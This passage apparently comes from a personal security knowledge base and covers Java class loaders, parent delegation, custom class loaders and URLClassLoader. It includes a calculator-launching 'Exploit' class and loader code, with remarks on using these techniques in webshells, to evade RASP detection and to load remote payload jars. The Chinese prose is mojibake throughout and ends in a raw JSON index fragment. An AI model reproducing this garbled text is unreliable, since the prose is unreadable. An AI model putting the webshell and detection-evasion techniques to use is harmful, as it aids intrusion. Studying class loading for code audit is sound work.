è½½å™¨è¿˜å¯ä»¥åˆ’åˆ†å¾—æ›´ç»†è‡´ä¸€äº›ï¼Œç»å¤§éƒ¨åˆ†Javaç¨‹åºéƒ½ä¼šä½¿ç”¨åˆ°ä»¥ä¸‹3ç§ç³»ç»Ÿæä¾›çš„ç±»åŠ è½½å™¨: å¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader) å¯åŠ¨ç±»åŠ è½½å™¨æ˜¯æœ€åº•å±‚çš„ç±»åŠ è½½å™¨ï¼Œæ˜¯JVMçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæ˜¯ç”±C++è¯­è¨€å®ç°çš„ï¼Œä¸”æ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¹Ÿæ²¡æœ‰ç»§æ‰¿java.lang.ClassLodaerç±»ã€‚ è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£å°†å­˜æ”¾åœ¨ï¼œJAVA_HOMEï¼/libå’Œï¼œJAVA_HOMEï¼/jre/libç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢«-Xbootclasspathå‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„ï¼Œå¹¶ä¸”æ˜¯è™šæ‹Ÿæœºè¯†åˆ«çš„ç±»åº“åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ã€‚ï¼ˆæŒ‰ç…§æ–‡ä»¶åè¯†åˆ«ï¼Œå¦‚tools.jarã€rt.jarï¼Œåå­—ä¸ç¬¦åˆçš„ç±»åº“å³ä½¿æ”¾åœ¨libç›®å½•ä¸­ä¹Ÿä¸ä¼šè¢«åŠ è½½ï¼‰ å¤„äºå®‰å…¨è€ƒè™‘ï¼Œæ ¹ç±»åŠ è½½å™¨åªåŠ è½½javaã€javaxã€sunå¼€å¤´çš„ç±»ã€‚ public class TestClassLoader { public static void main(String[] args) { System.out.println(java.lang.String.class.getClassLoader()); // null } } æ‰©å±•ç±»åŠ è½½å™¨(Extension ClassLoader) è¿™ä¸ªåŠ è½½å™¨ç”±sun.misc.Launcher$ExtClassLoaderå®ç°ï¼Œå®ƒè´Ÿè´£åŠ è½½ï¼œJAVA_HOMEï¼/lib/extå’Œï¼œJAVA_HOMEï¼/jre/lib/extç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢«java.ext.dirsç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨æ‰©å±•ç±»åŠ è½½å™¨ã€‚ public class TestClassLoader { public static void main(String[] args) { System.out.println(com.sun.nio.zipfs.ZipFileStore.class.getClassLoader()); // sun.misc.Launcher$ExtClassLoader@6bc168e5 } } åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨(Application ClassLoader) è¿™ä¸ªç±»åŠ è½½å™¨ç”±sun.misc.Launcher$AppClassLoaderæ¥å®ç°ã€‚ ç”±äºåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨æ˜¯ClassLoaderç±»ä¸­çš„getSystemClassLoader()æ–¹æ³•çš„è¿”å›å€¼ï¼Œæ‰€ä»¥æœ‰äº›åœºåˆä¸­ä¹Ÿç§°å®ƒä¸ºâ€œç³»ç»Ÿç±»åŠ è½½å™¨â€ã€‚ ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); å®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æœ‰çš„ç±»åº“ï¼Œå¼€å‘è€…åŒæ ·å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è¿‡è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªå°±æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚ public class TestClassLoader { public static void main(String[] args) { System.out.println(TestClassLoader.class.getClassLoader()); // sun.misc.Launcher$AppClassLoader@18b4aac2 } } æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºéƒ½æ˜¯ç”±è¿™3ç§ç±»åŠ è½½å™¨äº’ç›¸é…åˆè¿›è¡ŒåŠ è½½çš„ï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œè¿˜å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚ æ³¨æ„ æŸäº›æ—¶å€™æˆ‘ä»¬è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨æ—¶å€™å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªnullå€¼ï¼Œå¦‚:java.io.File.class.getClassLoader()å°†è¿”å›ä¸€ä¸ªnullå¯¹è±¡ï¼Œå› ä¸ºjava.io.Fileç±»åœ¨JVMåˆå§‹åŒ–çš„æ—¶å€™ä¼šè¢«Bootstrap ClassLoader(å¼•å¯¼ç±»åŠ è½½å™¨)åŠ è½½(è¯¥ç±»åŠ è½½å™¨å®ç°äºJVMå±‚ï¼Œé‡‡ç”¨C++ç¼–å†™)ï¼Œæˆ‘ä»¬åœ¨å°è¯•è·å–è¢«Bootstrap ClassLoaderç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»çš„ClassLoaderæ—¶å€™éƒ½ä¼šè¿”å›nullã€‚ import java.io.File; public class TestClassLoader { public static void main(String[] args) { System.out.println(File.class.getClassLoader()); } } ç±»åŠ è½½çš„å‡ ç§æ–¹å¼ Javaç±»åŠ è½½æ–¹å¼åˆ†ä¸ºæ˜¾å¼å’Œéšå¼,æ˜¾å¼å³æˆ‘ä»¬é€šå¸¸ä½¿ç”¨Javaåå°„æˆ–è€…ClassLoaderæ¥åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»å¯¹è±¡ï¼Œè€Œéšå¼æŒ‡çš„æ˜¯ç±»å.æ–¹æ³•å()æˆ–newç±»å®ä¾‹ã€‚æ˜¾å¼ç±»åŠ è½½æ–¹å¼ä¹Ÿå¯ä»¥ç†è§£ä¸ºç±»åŠ¨æ€åŠ è½½ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»åŠ è½½ä»»æ„çš„ç±»ã€‚ å‘½ä»¤è¡Œå¯åŠ¨åº”ç”¨æ—¶å€™ç”±JVMåˆå§‹åŒ–åŠ è½½ é€šè¿‡Class.forName()æ–¹æ³•åŠ¨æ€åŠ è½½ é€šè¿‡ClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ public class TestClassLoader { public static void main(String[] args) throws ClassNotFoundException { // é»˜è®¤ä¼šæ‰§è¡Œåˆå§‹åŒ–é™æ€ä»£ç å— Class.forName(\"Test\"); // ä½¿ç”¨åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨æ¥åŠ è½½ç±»Testï¼Œä¸ä¼šæ‰§è¡Œåˆå§‹åŒ–é™æ€ä»£ç å— ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); appClassLoader.loadClass(\"Test\"); //forNameæŒ‡å®šäº†classLoaderï¼Œinitializeä¸ºfalseä¸ä¼šæ‰§è¡Œåˆå§‹åŒ–é™æ€ä»£ç å—ï¼Œä¸ºtrueåˆ™ä¼šæ‰§è¡Œ Class.forName(\"Test\", false, appClassLoader); } } class Test { static { System.out.println(\"é™æ€æ–¹æ³•è¢«æ‰§è¡Œäº†\"); } } åˆ†åˆ«è¿è¡Œä¸Šé¢å‡ ç§ç±»åŠ è½½æ–¹å¼ï¼Œå¯ä»¥çœ‹å‡ºæ¥Class.forName()å’ŒClassLoader.loadClass()çš„åŒºåˆ« Class.forName(): å°†ç±»çš„.classæ–‡ä»¶åŠ è½½åˆ°jvmä¸­ä¹‹å¤–ï¼Œè¿˜ä¼šå¯¹ç±»è¿›è¡Œè§£é‡Šï¼Œæ‰§è¡Œç±»ä¸­çš„staticå—ï¼› ClassLoader.loadClass(): åªå¹²ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯å°†.classæ–‡ä»¶åŠ è½½åˆ°jvmä¸­ï¼Œä¸ä¼šæ‰§è¡Œstaticä¸­çš„å†…å®¹,åªæœ‰åœ¨newInstance()æ‰ä¼šå»æ‰§è¡Œstaticå—; Class.forName(name, initialize, loader)å¸¦å‚å‡½æ•°ä¹Ÿå¯æ§åˆ¶æ˜¯å¦åŠ è½½staticå—ã€‚å¹¶ä¸”åªæœ‰è°ƒç”¨äº†newInstance()æ–¹æ³•é‡‡ç”¨è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»çš„å¯¹è±¡ã€‚ JVMç±»åŠ è½½æœºåˆ¶ å…¨ç›˜è´Ÿè´£ å½“ä¸€ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½æŸä¸ªClassæ—¶ï¼Œè¯¥Classæ‰€ä¾èµ–çš„å’Œå¼•ç”¨çš„å…¶ä»–Classä¹Ÿå°†ç”±è¯¥ç±»åŠ è½½å™¨è´Ÿè´£è½½å…¥ï¼Œé™¤éæ˜¾ç¤ºä½¿ç”¨å¦å¤–ä¸€ä¸ªç±»åŠ è½½å™¨æ¥è½½å…¥ã€‚ çˆ¶ç±»å§”æ‰˜ å…ˆè®©çˆ¶ç±»åŠ è½½å™¨è¯•å›¾åŠ è½½è¯¥ç±»ï¼Œåªæœ‰åœ¨çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»æ—¶æ‰å°è¯•ä»è‡ªå·±çš„ç±»è·¯å¾„ä¸­åŠ è½½è¯¥ç±»ã€‚ ç¼“å­˜æœºåˆ¶ ç¼“å­˜æœºåˆ¶å°†ä¼šä¿è¯æ‰€æœ‰åŠ è½½è¿‡çš„Classéƒ½ä¼šè¢«ç¼“å­˜ï¼Œå½“ç¨‹åºä¸­éœ€è¦ä½¿ç”¨æŸä¸ªClassæ—¶ï¼Œç±»åŠ è½½å™¨å…ˆä»ç¼“å­˜åŒºå¯»æ‰¾è¯¥Classï¼Œåªæœ‰ç¼“å­˜åŒºä¸å­˜åœ¨ï¼Œç³»ç»Ÿæ‰ä¼šè¯»å–è¯¥ç±»å¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶å°†å…¶è½¬æ¢æˆClasså¯¹è±¡ï¼Œå­˜å…¥ç¼“å­˜åŒºã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¿®æ”¹äº†Classåï¼Œå¿…é¡»é‡å¯JVMï¼Œç¨‹åºçš„ä¿®æ”¹æ‰ä¼šç”Ÿæ•ˆã€‚ åŒäº²å§”æ´¾æœºåˆ¶ åŒäº²å§”æ´¾æ¨¡å‹çš„å·¥ä½œè¿‡ç¨‹æ˜¯ï¼šå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„ç±»åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„åŠ è½½è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»å®ŒæˆåŠ è½½ã€‚ ç±»çš„åŒäº²å§”æ´¾æœºåˆ¶ ä¸Šå›¾å±•ç¤ºçš„ç±»åŠ è½½å™¨ä¹‹é—´çš„è¿™ç§å±‚æ¬¡å…³ç³»ï¼Œç§°ä¸ºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParents Delegation Modelï¼‰ã€‚ åŒäº²å§”æ´¾æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”å½“æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚ è¿™é‡Œç±»åŠ è½½å™¨ä¹‹é—´çš„çˆ¶å­å…³ç³»ä¸€èˆ¬ä¸ä¼šä»¥ç»§æ‰¿ï¼ˆInheritanceï¼‰çš„å…³ç³»æ¥å®ç°ï¼Œè€Œæ˜¯éƒ½ä½¿ç”¨ç»„åˆï¼ˆCompositionï¼‰å…³ç³»æ¥å¤ç”¨çˆ¶åŠ è½½å™¨çš„ä»£ç ã€‚ ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹åœ¨JDK1.2æœŸé—´è¢«å¼•å…¥å¹¶è¢«å¹¿æ³›åº”ç”¨äºä¹‹åå‡ ä¹æ‰€æœ‰çš„Javaç¨‹åºä¸­ï¼Œä½†å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå¼ºåˆ¶æ€§çš„çº¦æŸæ¨¡å‹ï¼Œè€Œæ˜¯Javaè®¾è®¡è€…æ¨èç»™å¼€å‘è€…çš„ä¸€ç§ç±»åŠ è½½å™¨å®ç°æ–¹å¼. åŒäº²å§”æ´¾æœºåˆ¶çš„å·¥ä½œæµç¨‹ å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡çš„ç±»åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œå› æ­¤æ‰€æœ‰çš„åŠ è½½è¯·æ±‚æœ€ç»ˆéƒ½åº”è¯¥ä¼ é€åˆ°æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ä¸­ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»å®ŒæˆåŠ è½½ã€‚ ä¸¾ä¾‹ï¼š å½“AppClassLoaderåŠ è½½ä¸€ä¸ªclassæ—¶ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠç±»åŠ è½½è¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ExtClassLoaderå»å®Œæˆã€‚ å½“ExtClassLoaderåŠ è½½ä¸€ä¸ªclassæ—¶ï¼Œå®ƒé¦–å…ˆä¹Ÿä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠç±»åŠ è½½è¯·æ±‚å§”æ´¾ç»™BootStrapClassLoaderå»å®Œæˆã€‚ å¦‚æœBootStrapClassLoaderåŠ è½½å¤±è´¥(ä¾‹å¦‚åœ¨$JAVA_HOME/jre/libé‡ŒæœªæŸ¥æ‰¾åˆ°è¯¥class)ï¼Œä¼šä½¿ç”¨ExtClassLoaderæ¥å°è¯•åŠ è½½ï¼› è‹¥ExtClassLoaderä¹ŸåŠ è½½å¤±è´¥ï¼Œåˆ™ä¼šä½¿ç”¨AppClassLoaderæ¥åŠ è½½ï¼Œå¦‚æœAppClassLoaderä¹ŸåŠ è½½å¤±è´¥ï¼Œåˆ™ä¼šæŠ¥å‡ºå¼‚å¸¸ClassNotFoundExceptionã€‚ ä»£ç ä¸¾ä¾‹ï¼š /** * è¾“å‡ºç»“æœï¼š * sun.misc.Launcher$AppClassLoader@18b4aac2 * sun.misc.Launcher$ExtClassLoader@61064425 * null */ public class TestClassLoader { public static void main(String[] args) { ClassLoader loader= TestClassLoader.class.getClassLoader(); while(loader!=null){ System.out.println(loader); loader=loader.getParent(); } System.out.println(loader); } } åŒäº²å§”æ´¾æœºåˆ¶çš„ä¼˜ç‚¹ ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹æ¥ç»„ç»‡ç±»åŠ è½½å™¨ä¹‹é—´çš„å…³ç³»ï¼Œæœ‰ä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„å¥½å¤„å°±æ˜¯Javaç±»éšç€å®ƒçš„ç±»åŠ è½½å™¨ä¸€èµ·å…·å¤‡äº†ä¸€ç§å¸¦æœ‰ä¼˜å…ˆçº§çš„å±‚æ¬¡å…³ç³»ã€‚ ä¾‹å¦‚ç±»java.lang.Objectï¼Œå®ƒå­˜æ”¾åœ¨rt.jarä¹‹ä¸­ï¼Œæ— è®ºå“ªä¸€ä¸ªç±»åŠ è½½å™¨è¦åŠ è½½è¿™ä¸ªç±»ï¼Œæœ€ç»ˆéƒ½æ˜¯å§”æ´¾ç»™å¤„äºæ¨¡å‹æœ€é¡¶ç«¯çš„å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œå› æ­¤Objectç±»åœ¨ç¨‹åºçš„å„ç§ç±»åŠ è½½å™¨ç¯å¢ƒä¸­éƒ½æ˜¯åŒä¸€ä¸ªç±»ã€‚ç›¸åï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨åŒäº²å§”æ´¾æ¨¡å‹ï¼Œç”±å„ä¸ªç±»åŠ è½½å™¨è‡ªè¡Œå»åŠ è½½çš„è¯ï¼Œå¦‚æœç”¨æˆ·è‡ªå·±ç¼–å†™äº†ä¸€ä¸ªç§°ä¸ºjava.lang.Objectçš„ç±»ï¼Œå¹¶æ”¾åœ¨ç¨‹åºçš„ClassPathä¸­ï¼Œé‚£ç³»ç»Ÿä¸­å°†ä¼šå‡ºç°å¤šä¸ªä¸åŒçš„Objectç±»ï¼ŒJavaç±»å‹ä½“ç³»ä¸­æœ€åŸºç¡€çš„è¡Œä¸ºä¹Ÿå°±æ— æ³•ä¿è¯ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå°†ä¼šå˜å¾—ä¸€ç‰‡æ··ä¹±ã€‚ æ‰€ä»¥å®ƒçš„ä¼˜ç‚¹ ç³»ç»Ÿç±»é˜²æ­¢å†…å­˜ä¸­å‡ºç°å¤šä»½åŒæ ·çš„å­—èŠ‚ç  ä¿è¯Javaç¨‹åºå®‰å…¨ç¨³å®šè¿è¡Œ åŒäº²å§”æ´¾æœºåˆ¶ä»£ç å®ç° ä»£ç å®ç°ä¸»è¦åœ¨ClassLoaderç±»çš„loadClasså‡½æ•°ä¸­ ç”±æ­¤ä¹Ÿå¯çœ‹å‡ºï¼Œæˆ‘ä»¬å¦‚æœè¦è‡ªå®šä¹‰ä¸€ä¸ªç±»åŠ è½½å™¨ï¼Œé‚£ä¹ˆéœ€è¦é‡å†™çš„å°±æ˜¯findClass()æ–¹æ³•ï¼Œè€Œä¸æ˜¯loadClass()æ–¹æ³• ç±»åŠ è½½å™¨çš„æ ¸å¿ƒæ–¹æ³• loadClass(åŠ è½½æŒ‡å®šçš„Javaç±») findClass(æŸ¥æ‰¾æŒ‡å®šçš„Javaç±») findLoadedClass(æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±») defineClass(å®šä¹‰ä¸€ä¸ªJavaç±») resolveClass(é“¾æ¥æŒ‡å®šçš„Javaç±») è‡ªå®šä¹‰ç±»åŠ è½½å™¨ é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç›´æ¥ä½¿ç”¨ç³»ç»Ÿç±»åŠ è½½å™¨ã€‚ä½†æ˜¯æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦è‡ªå®šä¹‰ç±»åŠ è½½å™¨ã€‚æ¯”å¦‚åº”ç”¨æ˜¯é€šè¿‡ç½‘ç»œæ¥ä¼ è¾“Javaç±»çš„å­—èŠ‚ç ï¼Œä¸ºä¿è¯å®‰å…¨æ€§ï¼Œè¿™äº›å­—èŠ‚ç ç»è¿‡äº†åŠ å¯†å¤„ç†ï¼Œè¿™æ—¶ç³»ç»Ÿç±»åŠ è½½å™¨å°±æ— æ³•å¯¹å…¶è¿›è¡ŒåŠ è½½ï¼Œè¿™æ ·åˆ™éœ€è¦è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ¥å®ç°ã€‚ åˆ©ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æˆ‘ä»¬å¯ä»¥åœ¨webshellä¸­å®ç°åŠ è½½å¹¶è°ƒç”¨è‡ªå·±ç¼–è¯‘çš„ç±»å¯¹è±¡ï¼Œæ¯”å¦‚æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´è°ƒç”¨è‡ªå®šä¹‰ç±»å­—èŠ‚ç çš„nativeæ–¹æ³•ç»•è¿‡RASPæ£€æµ‹ï¼Œä¹Ÿå¯ä»¥ç”¨äºåŠ å¯†é‡è¦çš„Javaç±»å­—èŠ‚ç (åªèƒ½ç®—å¼±åŠ å¯†äº†)ã€‚ è‡ªå®šä¹‰ç±»åŠ è½½å™¨ä¸€èˆ¬éƒ½æ˜¯ç»§æ‰¿è‡ªClassLoaderç±»ï¼Œä»ä¸Šé¢å¯¹loadClassæ–¹æ³•æ¥åˆ†ææ¥çœ‹ï¼Œæˆ‘ä»¬åªéœ€è¦é‡å†™ findClass æ–¹æ³•å³å¯ã€‚ æ³¨æ„ï¼š è¿™é‡Œä¼ é€’çš„æ–‡ä»¶åéœ€è¦æ˜¯ç±»çš„å…¨é™å®šæ€§åç§°ï¼Œå³com.test.Testæ ¼å¼çš„ï¼Œå› ä¸º defineClass æ–¹æ³•æ˜¯æŒ‰è¿™ç§æ ¼å¼è¿›è¡Œå¤„ç†çš„ã€‚ æœ€å¥½ä¸è¦é‡å†™loadClassæ–¹æ³•ï¼Œå› ä¸ºè¿™æ ·å®¹æ˜“ç ´ååŒäº²å§”æ‰˜æ¨¡å¼ã€‚ è¿™ç±»Testç±»æœ¬èº«å¯ä»¥è¢« AppClassLoader ç±»åŠ è½½ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½æŠŠcom/test/Test æ”¾åœ¨ç±»è·¯å¾„ä¸‹ã€‚å¦åˆ™ï¼Œç”±äºåŒäº²å§”æ‰˜æœºåˆ¶çš„å­˜åœ¨ï¼Œä¼šç›´æ¥å¯¼è‡´è¯¥ç±»ç”± AppClassLoader åŠ è½½ï¼Œè€Œä¸ä¼šé€šè¿‡æˆ‘ä»¬è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ¥åŠ è½½ã€‚ ä¸¾ä¾‹ï¼šæ­¤å¤„æˆ‘é€šè¿‡æœ¬åœ°classæ–‡ä»¶çš„å­—èŠ‚ç æ¥åŠ è½½class éœ€è¦åŠ è½½çš„classæºç  import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } ç¼–è¯‘æˆclassæ–‡ä»¶ javac Exploit.java JVMæ‰§è¡Œçš„å…¶å®å°±æ˜¯javapå‘½ä»¤ç”Ÿæˆçš„å­—èŠ‚ç (ByteCode)ã€‚ ç¼–å†™TestClassLoaderåŠ è½½è¿™ä¸ªclass import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class TestClassLoader extends ClassLoader { /** * é‡å†™äº†findClassæ–¹æ³• */ @Override protected Class findClass(String name) throws ClassNotFoundException { byte[] bytes = new byte[0]; try { bytes = loadClassData(); } catch (IOException e) { e.printStackTrace(); } if (bytes == null) { throw new ClassNotFoundException(name); } else { return defineClass(\"Exploit\", bytes, 0, bytes.length); } } /** * ç»™classæ–‡ä»¶ä»¥å­—èŠ‚ç çš„å½¢å¼è¿”å› */ private byte[] loadClassData() throws IOException { String fileName = \"/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.class\"; try { InputStream ins = new FileInputStream(fileName); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; int length = 0; while ((length = ins.read(buffer)) != -1) { baos.write(buffer, 0, length); } return baos.toByteArray(); } catch (IOException e) { e.printStackTrace(); } return null; } public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { TestClassLoader testClassLoader = new TestClassLoader(); // loadClassçš„æ—¶å€™ä¸Šå±‚çš„ClassLoaderéƒ½æ‰¾ä¸åˆ°å¯¹åº”çš„ç±»ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨å®ƒè‡ªå·±çš„findClasså»åŠ è½½ç±» Class test = testClassLoader.loadClass(\"Exploit\"); System.out.println(test.getClassLoader()); // ç”³è¯·å®ä¾‹ test.newInstance(); } } URLClassLoader URLClassLoaderç»§æ‰¿äº†ClassLoaderï¼ŒURLClassLoaderæä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„payloadæˆ–è€…webshellçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„jaræ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚ è¿œç¨‹ç±»æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰ç±»åŠ è½½å™¨ä¸­ç¼–è¯‘çš„Exploit.classå§ ä¸‹æ–¹å‘½ä»¤ç»™classæ‰“åŒ…æˆjarï¼Œä¹Ÿå¯ä»¥ç›´æ¥å‹ç¼©ä¸ºzipå†æ”¹åç¼€ jar cvf Exploit.jar Exploit.class ç¼–å†™è¿œç¨‹åŠ è½½jarä»£ç  import java.io.IOException; import java.net.URL; import java.net.URLClassLoader; public class TestClassLoader { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException { // ä¹Ÿå¯ä»¥æ­å»ºä¸ªwebæœåŠ¡å™¨ç”¨httpåè®®æ¥è¿œç¨‹åŠ è½½ URL url = new URL(\"file:/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.jar\"); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class exploit = urlClassLoader.loadClass(\"Exploit\"); exploit.newInstance(); } } å‚è€ƒ å…³äºJVMç±»åŠ è½½æœºåˆ¶ï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº† Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/02.Javaåå°„æœºåˆ¶.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/02.Javaåå°„æœºåˆ¶.html","title":"02.Javaåå°„æœºåˆ¶","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 åå°„ ä½•ä¸ºåå°„ è·å–classçš„Classå®ä¾‹ æ–¹æ³•ä¸€ æ–¹æ³•äºŒ æ–¹æ³•ä¸‰ æ–¹æ³•å›› æ¯”è¾ƒ è·å–åŸºæœ¬ä¿¡æ¯ å°ç»“ è®¿é—®å­—æ®µ è·å–å­—æ®µçš„ä¸€äº›ä¿¡æ¯ è·å–å­—æ®µçš„å€¼ ä¿®æ”¹å­—æ®µçš„å€¼ å°ç»“ è°ƒç”¨æ–¹æ³•ï¼ˆâ€¼ï¸ï¼‰ è·å–æ–¹æ³• è°ƒç”¨æ–¹æ³• å°ç»“ è°ƒç”¨æ„é€ æ–¹æ³• ä¸¾ä¾‹ å°ç»“ è·å–ç»§æ‰¿å…³ç³» è·å–çˆ¶ç±»classå’Œinterface å°ç»“ åŠ¨æ€ä»£ç† è¿‡ç¨‹ å°ç»“ åå°„ ä½•ä¸ºåå°„ 